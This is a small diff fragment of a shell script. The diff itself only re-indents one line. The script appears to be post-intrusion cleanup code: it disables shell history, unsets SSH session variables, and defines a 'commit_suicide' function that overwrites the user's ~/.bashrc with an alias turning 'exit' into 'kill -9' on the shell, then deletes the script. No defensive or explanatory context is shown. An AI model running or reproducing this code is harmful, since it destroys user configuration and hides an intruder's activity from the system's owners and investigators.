@@ -8,7 +8,7 @@ export HISTFILE=/dev/null
 unset SSH_CONNECTION
 unset SSH_CLIENT
 function commit_suicide {
-	cat > ~/.bashrc << EOF
+cat > ~/.bashrc << EOF
 alias exit='kill -9 $$'
 EOF
 rm $0
